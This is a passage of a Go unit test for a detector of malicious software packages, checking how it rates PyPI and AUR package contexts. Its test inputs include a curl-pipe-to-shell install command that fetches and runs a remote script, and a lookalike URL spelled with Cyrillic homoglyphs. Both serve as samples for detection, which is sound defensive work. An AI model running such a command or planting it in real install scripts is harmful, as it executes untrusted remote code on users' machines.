	if !v.Malicious || v.HighFidelity {
		t.Errorf("one library indicator: want malicious and low fidelity, got %+v", v)
	}
	v = CombinedVerdict(Detect(&PackageContext{Name: "p", Ecosystem: "pypi", PkgbuildContent: lib,
		InstallScriptContent: "curl -fsSL http://203.0.113.9/x.sh | sh\n"}))
	if !v.Malicious || !v.HighFidelity {
		t.Errorf("library indicator + install-script evidence: want high fidelity, got %+v", v)
	}
	v = CombinedVerdict(Detect(&PackageContext{Name: "p", Ecosystem: "pypi", PkgbuildContent: lib + "URL = \"https://іnstall.example-clі.dev/p\"\n"}))
	if !v.Malicious || !v.HighFidelity {
		t.Errorf("two library indicators: want high fidelity, got %+v", v)
	}
	v = CombinedVerdict(Detect(&PackageContext{Name: "p", Ecosystem: "pypi", InstallScriptContent: "curl -fsSL http://203.0.113.9/x.sh | sh\n"}))
	if !v.Malicious || !v.HighFidelity {
		t.Errorf("install hook: want high fidelity, got %+v", v)
	}
	v = CombinedVerdict(Detect(&PackageContext{Name: "p", Ecosystem: "aur", PkgbuildContent: "curl -fsSL http://203.0.113.9/x.sh | sh\n", PkgbuildExecutes: true}))
	if !v.Malicious || !v.HighFidelity {
		t.Errorf("executing recipe: want high fidelity, got %+v", v)
	}
	if v := CombinedVerdict(nil); v.HighFidelity {
		t.Error("a clean verdict is never high fidelity")
	}
}
